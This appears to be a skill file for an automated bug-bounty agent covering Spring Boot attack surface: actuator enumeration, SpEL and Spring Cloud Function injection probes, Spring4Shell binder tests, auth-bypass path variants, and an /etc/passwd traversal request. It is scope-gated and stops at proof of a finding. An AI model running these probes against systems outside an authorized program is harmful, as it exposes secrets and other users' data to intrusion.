---
name: zp-springboot
description: ZeroProtocol hunter for Spring Boot and Java web surface - exposed actuator endpoints (/env, /heapdump, /httpexchanges, /mappings, /gateway) and what each leaks, SpEL and Spring Cloud Function expression injection, Spring4Shell-class data binding, Spring Security matcher ordering gaps, Jackson polymorphic deserialization, and exposed H2, Jolokia, Eureka or Config Server. Use when a Whitelabel Error Page, an X-Application-Context header or an answering /actuator appears.
---

# zp-springboot - the management port answered on 443

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0 before any request.
Exit 1 refuse and name the pattern · 3 stop · 4 stop.

Spring's operational plumbing is not a separate service - it is HTTP endpoints in the same container as the app,
and one property (`management.endpoints.web.exposure.include=*`) publishes the JVM's whole state. The bar is never
a `200` on `/actuator`; it is the **named secret, the other user's header, the evaluated expression or the resolved
type id** - and for heapdump it is proof of downloadability, nothing more.

---

## Procedure

**1. Fingerprint the generation.** Boot 1.x serves actuators at the **root** (`/env`), 2.x and 3.x under `/actuator` - unless the base was renamed.
```bash
H=target.tld
curl -skI "https://$H/" | grep -iE 'x-application-context|^server:|x-powered-by'
curl -sk "https://$H/nope-$RANDOM" | grep -oiE 'whitelabel error page|org\.springframework[.a-zA-Z]*'
curl -sk "https://$H/error?trace=true" | head -c 300   # server.error.include-stacktrace=on_param
for b in "" /actuator /manage /management /admin /api/actuator; do
  printf '%-16s %s\n' "$b" "$(curl -sk -o /dev/null -w '%{http_code}' -H 'Accept: application/json' "https://$H$b/actuator")"; done
curl -sk -H 'Accept: application/json' "https://$H/actuator" | grep -oE '"href":"[^"]+"' | sort -u
```
`X-Application-Context` is Boot 1.x only and a Low leak itself; the HAL index names every registered endpoint.

**2. Enumerate by response shape, never by status code** - Spring answers `200` with a Whitelabel page, a login page or an SPA shell for paths that do not exist.
```bash
B="https://$H/actuator"     # Boot 1.x: B="https://$H"
for ep in env health info beans configprops mappings metrics loggers threaddump heapdump httpexchanges httptrace \
          auditevents sessions scheduledtasks quartz caches conditions flyway gateway jolokia refresh shutdown restart; do
  read -r code ctype < <(curl -sk -o /tmp/zp.body -w '%{http_code} %{content_type}\n' -H 'Accept: application/json' --max-time 20 "$B/$ep")
  case "$ctype" in *json*|*octet-stream*)
    grep -qiE 'whitelabel|<html|"status":4' /tmp/zp.body || echo "EXPOSED $code $ctype $B/$ep" ;; esac; done
```
Optional: `nuclei -u "https://$H" -t 'http/exposures/configs/springboot-*.yaml' -rate-limit "$(zp-scope show --json | jq -r '.rate_limit_rps // 5')"`. For an unfound base, hand SecLists `Discovery/Web-Content/spring-boot.txt` to `zp-content-discovery`.

**3. Read `/env` for names, not values.** Boot 2.6+ masks values whose key matches `password|secret|key|token`
and Boot 3 masks **every** value by default, so `******` is normal and not a kill - the leak is in what it misses.
```bash
curl -sk "$B/env" > /tmp/zp.env
grep -oE 'jdbc:[^"]+|mongodb(\+srv)?://[^"]+|amqp://[^"]+|redis://[^"]+|https?://[^"@]+:[^"@]+@[^"]+' /tmp/zp.env | sort -u
grep -oE '"[A-Za-z0-9_.-]*(url|uri|dsn|endpoint|host|bucket|account|user(name)?|zone|region)"' /tmp/zp.env | sort -u
```
A credential inside a **URI** (`jdbc:postgresql://user:pw@…`, `eureka…defaultZone=http://u:p@…`) sails past every key-name mask - that first grep is the highest-yield line in this skill.

**4. `/heapdump` - prove it, then stop.** It is a live copy of process memory holding session tokens, customer PII
and plaintext credentials; downloading it is exfiltration and mining it is worse.
```bash
curl -sk -r 0-63 --max-time 25 "$B/heapdump" -D /tmp/zp.hdr -o /tmp/zp.magic
head -c 32 /tmp/zp.magic | xxd | head -2     # "JAVA PROFILE 1.0.2" = a real HPROF stream
grep -iE 'content-length|content-type|content-range|content-disposition' /tmp/zp.hdr
curl -sk --max-time 8 --max-filesize 65536 "$B/heapdump" -o /tmp/zp.magic 2>/dev/null; head -c 24 /tmp/zp.magic; rm -f /tmp/zp.magic
```
Do **not** `strings | grep -i password` it, open it in MAT or JDumpSpider, or keep it - magic bytes plus `Content-Length` is a Critical report on its own, and the whole of your evidence.

**5. Test writability with an oracle, not a write** - Spring separates "method not allowed" from "body rejected",
so a malformed body proves POST-ability while changing nothing.
```bash
for ep in env refresh loggers/org.springframework.security gateway/refresh shutdown restart; do
  printf '%-44s ' "$ep"; curl -sk -o /dev/null -w '%{http_code}\n' -X POST "$B/$ep" -H 'Content-Type: application/json' -d '{}'; done
```
`405` read-only · `401`/`403` gated · **`400`** exists, accepts POST, parsed your body - that is the finding and you stop.
Poisoning `logging.config`, `spring.cloud.bootstrap.location` or `eureka.client.serviceUrl.defaultZone` then calling
`/refresh` is RCE by config injection, `/shutdown` and `/restart` are DoS, `/loggers` at TRACE harvests other people's credentials - all out of bounds.

**6. Expression injection - arithmetic only.** SpEL evaluates through `@Value`, mail and message templates, Spring
Security expression strings, `SpelExpressionParser` on user input and Spring Data `@Query`; `#{}` is SpEL, `${}` a
placeholder or Java EL, so send both.
```bash
for p in '#{7*7}' '${7*7}' 'zp#{"a".concat("b")}zp' '#{T(java.lang.System).getProperty("java.version")}'; do
  printf '%-52s ' "$p"; curl -sk -X POST "https://$H/api/profile" -H 'Content-Type: application/json' \
    --data-binary "{\"displayName\":\"$p\"}" | grep -oE '49|zpabzp|1[0-9]\.[0-9.]+' | head -1; echo; done
curl -sk -o /dev/null -w '%{http_code}\n' -X POST "https://$H/functionRouter" \
  -H 'spring.cloud.function.routing-expression: T(java.lang.String).valueOf(7*7)' -d zp   # CVE-2022-22963
curl -sk "$B/gateway/routes" | grep -oE '"(uri|route_id)":"[^"]+"' | sort -u | head -40   # CVE-2022-22947 surface
```
`49`, `zpabzp` or a JDK version string is confirmed evaluation; `${7*7}` echoed literally while `#{7*7}` evaluates pins
it as SpEL. Stop there - `T(java.lang.Runtime)` is RCE for `zp-rce-ssti` with permission and your own collector, and
`Thread.sleep()` is the excluded DoS class. Gateway routes alone leak the internal service map (Medium, feeder for
`zp-ssrf`); its SpEL filter chain is a **write** mutating live routing for every user of that gateway - only with explicit
permission, a benign arithmetic `AddResponseHeader` value, then `DELETE $B/gateway/routes/<id>` plus `/gateway/refresh`.

**7. Spring4Shell-class binding (CVE-2022-22965, fixed 5.3.18 / 5.2.20)** needs JDK 9+ and a WAR on Tomcat, so
most fat-jar Boot targets are unaffected whatever the version says.
```bash
curl -sk -o /dev/null -w 'probe=%{http_code}\n' "https://$H/" --data-urlencode 'class.module.classLoader.DefaultAssertionStatus=notabool'
curl -sk -o /dev/null -w 'base=%{http_code}\n'  "https://$H/" --data-urlencode 'zpharmless=1'
```
`400` on the `class.module.*` parameter where the harmless one gives `200`/`405` means the binder walked into the class
loader and failed to coerce - the vulnerable behaviour, non-destructively. Never send the public
`pipeline.first.pattern` chain: it writes a JSP into `webapps/ROOT` and reconfigures Tomcat's access log.

**8. Spring Security matcher gaps** - rules are ordered, first-match-wins, and matched against a path the
dispatcher may normalise differently from the proxy.
```bash
R=/admin/users
for v in "$R" "$R/" "$R//" "$R/." "$R;zp=1" "$R.json" "/./admin/users" "//admin/users" "/ADMIN/users" \
         "/admin/../admin/users" "/admin%2fusers" "/..;/admin/users"; do
  printf '%-30s %s\n' "$v" "$(curl -sk -o /dev/null -w '%{http_code} %{size_download}' --path-as-is "https://$H$v")"; done
```
`--path-as-is` is mandatory - curl otherwise collapses `..` and `//` locally and you test nothing. A `200` whose size
matches the authenticated page where the canonical path gives `401`/`403` is bypass; diff `$B/mappings` patterns
against what the config guards for the same bug from the other side. Confirmations to `zp-authz`.

**9. Jackson polymorphic typing - resolve a type id, do not load a gadget.**
```bash
for body in '["zp.NoSuchClass",{}]' '{"@class":"zp.NoSuchClass"}' '{"type":"zp.NoSuchClass"}'; do
  curl -sk -X POST "https://$H/api/item" -H 'Content-Type: application/json' --data-binary "$body" \
    | grep -oiE 'could not resolve type id|InvalidTypeIdException|missing type id|ClassNotFoundException' | head -1; done
```
"Could not resolve type id 'zp.NoSuchClass'" proves the mapper honours attacker-supplied types
(`enableDefaultTyping()`, `@JsonTypeInfo(use = Id.CLASS)`) - that message is the finding. A real gadget (logback
`JNDIConnectionSource`, XStream, SnakeYAML) is exploitation - `zp-rce-ssti` and `zp-code-audit`.

**10. Adjacent Java consoles** - each is a separate report.
```bash
for p in /h2-console /h2 /console /jolokia /actuator/jolokia /jolokia/list /eureka/apps /hystrix /v3/api-docs /env /trace; do
  printf '%-24s %s\n' "$p" "$(curl -sk -o /dev/null -w '%{http_code} %{content_type}' "https://$H$p")"; done
curl -sk "https://$H/eureka/apps" | grep -oE '<hostName>[^<]+|<ipAddr>[^<]+' | sort -u | head -20
curl -sk "https://$H/application/default" | head -c 300      # Config Server, unauthenticated
curl -sk --path-as-is "https://$H/zp/default/master/..%252f..%252f..%252f..%252fetc%252fpasswd" | head -3  # CVE-2019-3799
curl -sk "https://$H/jolokia/read/java.lang:type=Runtime/VmVersion"    # one harmless JMX attribute
```
Proof stops at the H2 console **rendering to an unauthenticated request** (never `CREATE ALIAS`, which is RCE; at most
the one documented `sa`/empty pair, and only where policy permits default-credential testing), the Jolokia MBean list or
one benign attribute (never `exec`, never `reloadByURL`), Eureka's hostnames, and one Config Server property source.

**11. Stop point for this class.** The leaked value, the `400` oracle, the evaluated arithmetic, the unresolved type
id, the HPROF magic bytes, or the bypassed status code. You do not download a heap dump, POST a property, call
`/refresh`, `/shutdown` or `/restart`, raise a logger, create a gateway route without permission, write a JSP, or use
any credential found - a secret in `/env` is reported by **name and location**, never validated.

---

## Probes and payloads

| Probe | Targets | Positive looks like |
|---|---|---|
| `GET /actuator` with `Accept: application/json` | endpoint registry, `/mappings`, `/beans`, `/sessions` | HAL `_links`, route patterns, live session ids |
| `GET /env`, `/configprops` | property leak | `jdbc:`/`amqp:`/`user:pw@` URI, or an unmasked key |
| `GET /httpexchanges` (3.x), `/httptrace` (2.x), `/trace` (1.x) | **other users' requests** | `Cookie`, `Authorization`, `X-Api-Key` that are not yours |
| `GET /heapdump` with `-r 0-63`, then `POST /env` with `{}` | memory disclosure, then writability | `JAVA PROFILE 1.0.2` + a large `Content-Length`; **`400`** (exists, parsed) vs `405` vs `401` |
| `#{7*7}`, `zp#{"a".concat("b")}zp`, and `class.module.classLoader.DefaultAssertionStatus=notabool` | SpEL evaluation, CVE-2022-22965 binder | `49`, `zpabzp` reflected; `400` where a harmless parameter gives `200` |
| `spring.cloud.function.routing-expression` header on `/functionRouter` | CVE-2022-22963 | expression result, or a `500` naming SpEL |
| `["zp.NoSuchClass",{}]`, `{"@class":"zp.NoSuchClass"}` | Jackson polymorphic typing | "could not resolve type id" |
| `/admin/users;zp=1`, `/..;/admin/users`, `/admin/users.json` (`--path-as-is`) | matcher ordering | `200` + authenticated body size where the canonical path gives `403` |
| `GET /gateway/routes`, `/eureka/apps`, `/application/default` | service map, registry, Config Server | internal URIs, hostnames, property sources |

`curl` plus `grep -oE` is the whole kit; `jq` and `python3 -m json.tool` are conveniences where present.

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| `/heapdump` returns HPROF magic bytes unauthenticated | **confirmed. Critical.** Report magic bytes and size, nothing else |
| `/httpexchanges` or `/trace` showing another user's `Cookie` or `Authorization` | **confirmed. High to Critical** - session theft, and it is other people's data. One capture, then stop |
| `/env` leaking a credential inside a URI, or an unmasked secret key | **confirmed. High.** Name the property; never test it |
| `POST /env` or `/refresh` returns `400` | **confirmed config-injection RCE surface. Critical** - the oracle is the proof |
| `#{7*7}` → `49` in the response | **confirmed SpEL injection. Critical** once the sink is named - `zp-rce-ssti` |
| Jackson resolves an attacker-supplied type id | **confirmed unsafe polymorphic deserialization. High to Critical**, pending a classpath gadget |
| H2 console or Jolokia reachable unauthenticated | **confirmed. Critical** - SQL and JMX are one step from RCE |
| `/env` exposed but every value is `******` | **still a finding, downgraded.** Boot 3 masks by default; names, profiles and URIs remain the impact |
| `/actuator` returns `200` with a Whitelabel, login or SPA page | **not exposed.** The status code lied. Killed |
| only `/health` and `/info`, `"status":"UP"` | **the documented default. Not a finding.** `show-details=always` leaking hosts is Low, as are `/metrics`, `/beans` and `/mappings` alone - chain material, never Critical |
| `403` on `/actuator/env` from the edge, `200` via a bypass path | **confirmed authorization bypass**, outranking the leak - `zp-authz` |
| version in range for Spring4Shell, binder probe gives no `400`, or `${7*7}` echoed literally | **unconfirmed.** Fat-jar and JDK 8 deployments are unaffected, and a `500` with no arithmetic is a rejection or a WAF. Killed - `zp-cve` |
| reachable only as `127.0.0.1` through a fetcher | an SSRF finding, not an exposure - `zp-ssrf` |
| the base sits behind mTLS or an internal listener you reached by accident | stop, do not enumerate, and tell the program how you got there |

---

## High-value patterns

- **`/heapdump` on a forgotten staging or acquisition host** from `zp-recon-passive` - the best outcome here, and the one left exposed for years.
- **`/httpexchanges` on an API gateway** - it buffers the last 100 requests, so one GET hands you other customers' bearer tokens. Higher impact than `/env` and far less hunted.
- **A credential inside a URI** (`jdbc:`, `eureka…defaultZone`, `mongodb+srv://`) - defeats every key-name mask, Boot 3's included.
- **A renamed management base** - `/manage`, `/management`, `/api/actuator`, or `management.server.port` published through the same ingress. Programs harden `/actuator` and forget the rename.
- **`/mappings`, Eureka, Config Server or gateway routes** - the route and service map; undocumented admin routes are usually unguarded too, and a blind SSRF becomes a targeted one. Feed `zp-api`, `zp-graphql`, `zp-authz`, `zp-ssrf`.
- **A rule guarding `/admin/**` but not `/admin`**, or a `permitAll` ordered above the guard, or actuator reachable only through a proxy normalisation difference (`/..;/actuator/env`).

---

## Pitfalls

- **Downloading and mining a heap dump.** Every public Spring skill says `strings | grep password`. That is mass exfiltration of live customer credentials. Magic bytes and `Content-Length`, then stop.
- **Trusting `200`** - content-type plus body shape decides. And calling `/health` + `/info` a vulnerability, or reading `******` as "not exposed".
- **POSTing a property and calling `/refresh`.** RCE by config injection, and it changes the running app - the `400` oracle proves the same thing. Same for raising a logger to TRACE, which intercepts other users' credentials.
- **`/shutdown` or `/restart`** - DoS, excluded everywhere, not even to "confirm". Likewise `CREATE ALIAS` in H2, `exec` in Jolokia, logback `reloadByURL` and the Spring4Shell JSP, which are post-exploitation and persistence on someone's host; and brute-forcing H2 or JMX credentials, where one documented default is the most policy ever allows.
- **Omitting `--path-as-is`** on the matcher loop - curl normalises the payload away and you record false negatives.
- **Reporting a Spring version as Spring4Shell** - the deployment model decides; confirm the binder's `400`. And using a secret you found: name and location only, since validating it is unauthorized access.
- **Fuzzing all 25 endpoints across every host at full speed.** Read the `/actuator` index, then send ten requests, at the rate limit `zp-recon-active` recorded.

---

## Hand off to

New host or management port -> `zp-scope` first. SpEL and deserialization escalation -> `zp-rce-ssti`; gadget
reachability with source -> `zp-code-audit`. Leak framing -> `zp-info-disclosure`; version-to-CVE work (22965, 22963,
22947, 2019-3799) -> `zp-cve`. Gateway and Eureka URIs as fetch targets -> `zp-ssrf`. Matcher bypass -> `zp-authz`;
the `/mappings` inventory -> `zp-api`, `zp-graphql`, `zp-content-discovery`; `/sessions` ids -> `zp-session`,
`zp-jwt-oauth`; `/env` cloud keys -> `zp-cloud`; path normalisation -> `zp-semantic-confusion`, `zp-smuggling`;
datasource validation-query injection -> `zp-sqli`. Dedup -> `zp-intel`. Confirmed -> `zp-triage`, `zp-report`.
